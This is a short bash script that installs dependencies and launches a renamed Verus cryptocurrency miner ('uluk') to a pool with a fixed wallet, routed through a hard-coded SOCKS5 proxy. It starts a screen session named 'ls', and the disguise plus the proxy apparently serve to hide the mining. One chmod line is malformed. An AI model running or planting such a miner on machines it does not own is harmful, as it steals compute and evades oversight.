#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RPxxX7qjow4x62pZphikLAq7Ufz6xRX1CF
WORKER=$(echo $(shuf -i 1-1 -n 1)RIG-LIFE)
PROXY=socks5://72.206.181.105:64935
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
